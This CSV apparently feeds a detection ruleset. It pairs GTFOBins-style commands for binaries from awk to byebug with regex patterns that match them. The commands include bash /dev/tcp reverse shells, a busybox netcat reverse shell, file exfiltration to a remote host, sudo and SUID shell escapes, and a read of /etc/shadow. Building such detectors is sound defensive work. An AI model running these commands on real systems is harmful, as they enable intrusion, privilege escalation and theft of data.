"Name","Function","ExampleCode","RegexStrictV8","Notes"
"awk","limited-suid","./awk 'BEGIN {system(""/bin/sh"")}'","(?i)\b(?:\S*/)?awk\b.*system\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))\s*\).*/bin/sh.*BEGIN",""
"aws","shell","aws help
!/bin/sh","(?i)\b(?:\S*/)?aws\b.*/bin/sh",""
"aws","sudo","sudo aws help
!/bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"base32","file-read","base32 ""$LFILE"" | base32 --decode","(?i)\b(?:\S*/)?base32\b.*(?:""[^""]+""|\'[^\']+\')",""
"base32","suid","base32 ""$LFILE"" | base32 --decode","(?i)\b(?:\S*/)?base32\b.*(?:""[^""]+""|\'[^\']+\')",""
"base32","sudo","sudo base32 ""$LFILE"" | base32 --decode","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"base58","file-read","base58 ""$LFILE"" | base58 --decode","(?i)\b(?:\S*/)?base58\b.*(?:""[^""]+""|\'[^\']+\')",""
"base58","sudo","sudo base58 ""$LFILE"" | base58 --decode","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"base64","file-read","base64 ""$LFILE"" | base64 --decode","(?i)\b(?:\S*/)?base64\b.*(?:""[^""]+""|\'[^\']+\')",""
"base64","suid","./base64 ""$LFILE"" | base64 --decode","(?i)\b(?:\S*/)?base64\b.*(?:""[^""]+""|\'[^\']+\')",""
"base64","sudo","sudo base64 ""$LFILE"" | base64 --decode","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"basenc","file-read","basenc --base64 $LFILE | basenc -d --base64","(?i)\b(?:\S*/)?basenc\b.*.+",""
"basenc","suid","basenc --base64 $LFILE | basenc -d --base64","(?i)\b(?:\S*/)?basenc\b.*.+",""
"basenc","sudo","sudo basenc --base64 $LFILE | basenc -d --base64","(?i)\b(?:\S*/)?sudo\b.*.+",""
"basez","file-read","basez ""$LFILE"" | basez --decode","(?i)\b(?:\S*/)?basez\b.*(?:""[^""]+""|\'[^\']+\')",""
"basez","suid","./basez ""$LFILE"" | basez --decode","(?i)\b(?:\S*/)?basez\b.*(?:""[^""]+""|\'[^\']+\')",""
"basez","sudo","sudo basez ""$LFILE"" | basez --decode","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"bash","shell","bash","(?i)\b(?:\S*/)?bash\b.*.+",""
"bash","reverse-shell","bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'","(?i)\b(?:\S*/)?bash\b.*/dev/tcp.*\-c",""
"bash","file-upload","bash -c 'echo -e ""POST / HTTP/0.9\n\n$(<$LFILE)"" > /dev/tcp/$RHOST/$RPORT'","(?i)\b(?:\S*/)?bash\b.*/dev/tcp.*\-c",""
"bash","file-upload","bash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'","(?i)\b(?:\S*/)?bash\b.*/dev/tcp.*\-c",""
"bash","file-download","bash -c '{ echo -ne ""GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n"" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/$RHOST/$RPORT \
    | { while read -r; do [ ""$REPLY"" = ""$(echo -ne ""\r"")"" ] && break; done; cat; } > $LFILE'","(?i)\b(?:\S*/)?bash\b.*/dev/tcp.*\-c.*\-r",""
"bash","file-download","bash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'","(?i)\b(?:\S*/)?bash\b.*/dev/tcp.*\-c",""
"bash","file-write","bash -c 'echo DATA > $LFILE'","(?i)\b(?:\S*/)?bash\b.*\-c",""
"bash","file-write","history -c
DATA
history -w $LFILE","(?i)\b(?:\S*/)?history\b.*\-c",""
"bash","file-read","bash -c 'echo ""$(<$LFILE)""'","(?i)\b(?:\S*/)?bash\b.*\-c",""
"bash","file-read","history -r $LFILE
history","(?i)\b(?:\S*/)?history\b.*\-r",""
"bash","library-load","bash -c 'enable -f ./lib.so x'","(?i)\b(?:\S*/)?bash\b.*\-c",""
"bash","suid","./bash -p","(?i)\b(?:\S*/)?bash\b.*.+",""
"bash","sudo","sudo bash","(?i)\b(?:\S*/)?sudo\b.*.+",""
"batcat","shell","batcat --paging always /etc/profile
!/bin/sh","(?i)\b(?:\S*/)?batcat\b.*/bin/sh",""
"batcat","limited-suid","./batcat --paging always /etc/profile
!/bin/sh","(?i)\b(?:\S*/)?batcat\b.*/bin/sh",""
"batcat","sudo","sudo batcat --paging always /etc/profile
!/bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"bc","file-read","bc -s $LFILE
quit","(?i)\b(?:\S*/)?bc\b.*.+",""
"bc","sudo","sudo bc -s $LFILE
quit","(?i)\b(?:\S*/)?sudo\b.*.+",""
"bc","suid","./bc -s $LFILE
quit","(?i)\b(?:\S*/)?bc\b.*.+",""
"bconsole","shell","bconsole
@exec /bin/sh","(?i)\b(?:\S*/)?bconsole\b.*/bin/sh",""
"bconsole","sudo","sudo bconsole
@exec /bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"bconsole","file-read","bconsole -c /etc/shadow","(?i)\b(?:\S*/)?bconsole\b.*\-c",""
"bpftrace","sudo","sudo bpftrace -e 'BEGIN {system(""/bin/sh"");exit()}'","(?i)\b(?:\S*/)?sudo\b.*system\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))\s*\).*exit\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*/bin/sh.*BEGIN",""
"bpftrace","sudo","echo 'BEGIN {system(""/bin/sh"");exit()}' >$TF
sudo bpftrace $TF","(?i)\b(?:\S*/)?echo\b.*system\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))\s*\).*exit\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*/bin/sh.*BEGIN",""
"bpftrace","sudo","sudo bpftrace -c /bin/sh -e 'END {exit()}'","(?i)\b(?:\S*/)?sudo\b.*exit\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*/bin/sh.*\-c",""
"bridge","file-read","bridge -b ""$LFILE""","(?i)\b(?:\S*/)?bridge\b.*(?:""[^""]+""|\'[^\']+\')",""
"bridge","suid","./bridge -b ""$LFILE""","(?i)\b(?:\S*/)?bridge\b.*(?:""[^""]+""|\'[^\']+\')",""
"bridge","sudo","sudo bridge -b ""$LFILE""","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"bundle","shell","bundle help
!/bin/sh","(?i)\b(?:\S*/)?bundle\b.*/bin/sh",""
"bundle","shell","bundle exec /bin/sh","(?i)\b(?:\S*/)?bundle\b.*/bin/sh",""
"bundle","shell","touch $TF/Gemfile
cd $TF
bundle exec /bin/sh","(?i)\b(?:\S*/)?touch\b.*/bin/sh",""
"bundle","shell","touch $TF/Gemfile
cd $TF
bundle console
system('/bin/sh -c /bin/sh')","(?i)\b(?:\S*/)?touch\b.*system\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))\s*\).*/bin/sh.*\-c",""
"bundle","shell","echo 'system(""/bin/sh"")' > $TF/Gemfile
cd $TF
bundle install","(?i)\b(?:\S*/)?echo\b.*system\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))\s*\).*/bin/sh",""
"bundle","sudo","sudo bundle help
!/bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"bundler","shell","bundler help
!/bin/sh","(?i)\b(?:\S*/)?bundler\b.*/bin/sh",""
"bundler","shell","bundler exec /bin/sh","(?i)\b(?:\S*/)?bundler\b.*/bin/sh",""
"bundler","shell","touch $TF/Gemfile
cd $TF
bundler exec /bin/sh","(?i)\b(?:\S*/)?touch\b.*/bin/sh",""
"bundler","shell","touch $TF/Gemfile
cd $TF
bundler console
system('/bin/sh -c /bin/sh')","(?i)\b(?:\S*/)?touch\b.*system\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))\s*\).*/bin/sh.*\-c",""
"bundler","shell","echo 'system(""/bin/sh"")' > $TF/Gemfile
cd $TF
bundler install","(?i)\b(?:\S*/)?echo\b.*system\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))\s*\).*/bin/sh",""
"bundler","sudo","sudo bundler help
!/bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"busctl","shell","busctl --show-machine
!/bin/sh","(?i)\b(?:\S*/)?busctl\b.*/bin/sh",""
"busctl","shell","busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'","(?i)\b(?:\S*/)?busctl\b.*/bin/sh.*\-c",""
"busctl","sudo","sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'","(?i)\b(?:\S*/)?sudo\b.*/bin/sh.*\-c",""
"busctl","suid","./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'","(?i)\b(?:\S*/)?busctl\b.*/bin/sh",""
"busybox","shell","busybox sh","(?i)\b(?:\S*/)?busybox\b.*.+",""
"busybox","file-upload","busybox httpd -f -p $LPORT -h .","(?i)\b(?:\S*/)?busybox\b.*.+",""
"busybox","file-write","busybox sh -c 'echo ""DATA"" > $LFILE'","(?i)\b(?:\S*/)?busybox\b.*\-c",""
"busybox","file-read","./busybox cat ""$LFILE""","(?i)\b(?:\S*/)?busybox\b.*(?:""[^""]+""|\'[^\']+\')",""
"busybox","suid","./busybox sh","(?i)\b(?:\S*/)?busybox\b.*.+",""
"busybox","sudo","sudo busybox sh","(?i)\b(?:\S*/)?sudo\b.*.+",""
"busybox","reverse-shell","busybox nc -e /bin/sh $RHOST $RPORT","(?i)\b(?:\S*/)?busybox\b.*/bin/sh",""
"byebug","shell","echo 'system(""/bin/sh"")' > $TF
byebug $TF
continue","(?i)\b(?:\S*/)?echo\b.*system\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))\s*\).*/bin/sh",""
